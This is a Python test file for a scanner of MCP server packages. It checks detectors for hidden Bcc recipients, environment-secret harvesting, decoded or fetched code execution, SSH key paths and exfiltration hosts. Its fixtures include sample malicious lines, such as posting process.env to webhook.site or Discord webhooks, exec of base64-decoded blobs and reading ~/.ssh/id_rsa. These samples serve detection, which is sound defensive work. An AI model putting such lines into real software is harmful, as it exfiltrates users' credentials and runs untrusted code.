"""Source analysis (mcpiranha.source) and the MCP-SRC rules.

The negative cases are the shapes calibration found in real packages (calibration/README.md).
"""

import base64
import hashlib
import io
import tarfile
import zipfile
from pathlib import Path

import anyio
import pytest

from mcpiranha.core.models import Launch, Origin, ServerSnapshot, SourceHit, SourceTree
from mcpiranha.core.pipeline import scan
from mcpiranha.rules import load_rules
from mcpiranha.source import archive_files, collect, local_entry, verify
from mcpiranha.source import javascript as js
from mcpiranha.source import python as py

SRC_RULES = [r for r in load_rules(plugins=False) if r.id.startswith("MCP-SRC")]


def _kinds(hits: list[SourceHit]) -> set[str]:
    return {h.kind for h in hits}


@pytest.mark.parametrize(
    ("code", "kind"),
    [
        ('msg = {"To": to, "Bcc": "copy@collector.invalid"}', "hardcoded_recipient"),
        ('send(to=to, bcc="copy@collector.invalid")', "hardcoded_recipient"),
        ('headers["Cc"] = "copy@collector.invalid"', "hardcoded_recipient"),
        ('raw = "To: a@b.c\\nBcc: copy@collector.invalid\\n"', "hardcoded_recipient"),
        ("x = {k: v for k, v in os.environ.items() if 'TOKEN' in k}", "env_harvest"),
        ("x = {k: os.environ[k] for k in os.environ if 'SECRET' in k}", "env_harvest"),
        ("requests.post(u, data=json.dumps(dict(os.environ)))", "env_harvest"),
        ("exec(base64.b64decode(blob))", "dynamic_code"),
        ("eval(urllib.request.urlopen(u).read())", "dynamic_code"),
        ('KEY = Path.home() / ".ssh" / "id_rsa"', "sensitive_file"),
        ('U = "https://webhook.site/0000"', "exfil_host"),
        ('U = f"https://abc.ngrok-free.app/{x}"', "exfil_host"),
    ],
)
def test_python_detects(code: str, kind: str) -> None:
    assert kind in _kinds(py.analyze("m.py", code))


@pytest.mark.parametrize(
    "code",
    [
        "names = [k for k in os.environ if 'TOKEN' in k]",  # names only: a diagnostic
        "env = {**os.environ, 'FOO': '1'}",
        "subprocess.run(cmd, env=dict(os.environ))",
        'to = "support@example.com"',  # a recipient, but not a hidden copy
        'DESCRIPTION = "Never read ~/.ssh/id_rsa or other secrets for the user."',  # prose
        'INSTALL = "curl -LsSf https://astral.sh/uv/install.sh | sh"',  # install hint
        "exec(compile(source, path, 'exec'))",  # runs a file, nothing decoded
        "def broken(:",  # doesn't parse: no hits, no crash
    ],
)
def test_python_ignores(code: str) -> None:
    assert py.analyze("m.py", code) == []


@pytest.mark.parametrize(
    ("code", "kind"),
    [
        ("const m = { To: to, Bcc: 'phan@giftshop.club' };", "hardcoded_recipient"),
        ('mail.cc = "x@evil.example";', "hardcoded_recipient"),
        ("fetch(u, { body: JSON.stringify(process.env) });", "env_harvest"),
        ("const s = Object.entries(process.env).filter(([k]) => /TOKEN/.test(k));", "env_harvest"),
        (
            "for (const k in process.env) if (/SECRET/.test(k)) out[k] = process.env[k];",
            "env_harvest",
        ),
        ("eval(atob(payload));", "dynamic_code"),
        ("new Function(Buffer.from(x, 'base64').toString())();", "dynamic_code"),
        ("const p = path.join(os.homedir(), '.ssh', 'id_rsa');", "sensitive_file"),
        ("await fetch(`https://webhook.site/${id}`);", "exfil_host"),
        ("post('https://discord.com/api/webhooks/123456/abc');", "exfil_host"),
    ],
)
def test_javascript_detects(code: str, kind: str) -> None:
    assert kind in _kinds(js.analyze("m.js", code.encode()))


@pytest.mark.parametrize(
    "code",
    [
        "const env = { ...process.env, FOO: '1' };",
        "const names = Object.keys(process.env).filter(k => k.includes('TOKEN'));",
        "const d = 'Never read ~/.ssh/id_rsa or anything secret, this is a sentence.';",
        "const install = 'curl -fsSL https://example.com/install.sh | bash';",
        "eval(code);",  # nothing decoded or fetched in the argument
        "const t: string = 'ok'; export default t;",
    ],
)
def test_javascript_ignores(code: str) -> None:
    assert js.analyze("m.ts", code.encode()) == []


def test_minified_hits_show_nearby_code_not_the_whole_line() -> None:
    bundle = "var a=1;" * 2000 + "const m={Bcc:'x@evil.example'};" + "var b=2;" * 2000
    [hit] = js.analyze("dist/index.js", bundle.encode())
    assert "Bcc" in hit.code and len(hit.code) <= 200


def _tgz(files: dict[str, str]) -> bytes:
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as tar:
        for name, text in files.items():
            data = text.encode()
            info = tarfile.TarInfo(name)
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
    return buffer.getvalue()


def test_archives_are_read_in_memory_with_their_paths() -> None:
    data = _tgz({"package/dist/index.js": "x", "package/README.md": "no",
                 "package/node_modules/dep/i.js": "skip", "package/test/a.test.js": "skip",
                 "package/types.d.ts": "skip", "../escape.js": "outside"})  # fmt: skip
    assert [p for p, _ in archive_files(data, "pkg-1.0.0.tgz")] == ["dist/index.js",
                                                                    "escape.js"]  # fmt: skip
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as wheel:
        wheel.writestr("pkg/__init__.py", "x")
        wheel.writestr("pkg-1.0.dist-info/METADATA", "x")
    assert [p for p, _ in archive_files(buffer.getvalue(), "pkg-1.0-py3-none-any.whl")] == [
        "pkg/__init__.py"
    ]


def test_archive_hashes() -> None:
    data = b"archive"
    assert verify(data, "sha512-" + base64.b64encode(hashlib.sha512(data).digest()).decode())
    assert verify(data, "sha256:" + hashlib.sha256(data).hexdigest())
    assert not verify(data, "sha256:" + hashlib.sha256(b"other").hexdigest())
    assert not verify(data, "md5:whatever")


def _snapshot(command: str, *args: str, config: Path | None = None) -> ServerSnapshot:
    return ServerSnapshot(
        id="t:project:s",
        name="s",
        origin=Origin(
            kind="config", client="t", ref="s", config_path=str(config) if config else None
        ),
        launch=Launch(transport="stdio", command=command, args=list(args)),
        tools_listed=False,
    )


def test_local_scripts_are_found_and_analyzed(tmp_path: Path) -> None:
    (tmp_path / "server.py").write_text('m = {"bcc": "copy@collector.invalid"}\n')
    config = tmp_path / ".mcp.json"
    snapshot = _snapshot("python3", "server.py", config=config)
    assert local_entry(snapshot) == (tmp_path / "server.py").resolve()
    assert local_entry(_snapshot("npx", "-y", "pkg")) is None
    [out], warnings = anyio.run(lambda: collect([snapshot], download=False))
    assert warnings == [] and out.source is not None
    assert out.source.entrypoints == ["server.py"] and _kinds(out.source.hits) == {
        "hardcoded_recipient"
    }


def test_a_script_outside_a_project_is_read_alone(tmp_path: Path) -> None:
    (tmp_path / "server.py").write_text("x = 1\n")
    (tmp_path / "other.py").write_text('k = "~/.ssh/id_rsa"\n')
    [out], _ = anyio.run(lambda: collect([_snapshot("python", str(tmp_path / "server.py"))],
                                         download=False))  # fmt: skip
    assert out.source is not None and out.source.files == 1 and out.source.hits == []
    (tmp_path / "pyproject.toml").write_text("")
    [out], _ = anyio.run(lambda: collect([_snapshot("python", str(tmp_path / "server.py"))],
                                         download=False))  # fmt: skip
    assert out.source is not None and out.source.files == 2


def _found(*hits: tuple[str, str]) -> set[str]:
    tree = SourceTree(root="npm:pkg@1.0.0", language="js", files=1, hits=[
        SourceHit(kind=kind, file="index.js", line=1, code="code", detail=detail)  # type: ignore[arg-type]
        for kind, detail in hits
    ])  # fmt: skip
    snapshot = _snapshot("npx", "-y", "pkg").model_copy(update={"source": tree})
    return {f.rule_id for f in scan([snapshot], SRC_RULES).findings}


def test_rules() -> None:
    assert _found(("hardcoded_recipient", "bcc")) == {"MCP-SRC-001"}
    assert _found(("env_harvest", "x")) == {"MCP-SRC-002"}
    assert _found(("dynamic_code", "x")) == {"MCP-SRC-004"}
    assert _found(("exfil_host", "x")) == {"MCP-SRC-005"}
    # credential paths alone are common (SSH tunnels, deny-lists); with a way out, a stealer
    assert _found(("sensitive_file", "x")) == set()
    assert _found(("sensitive_file", "x"), ("exfil_host", "y")) == {"MCP-SRC-003", "MCP-SRC-005"}
    assert _found() == set()
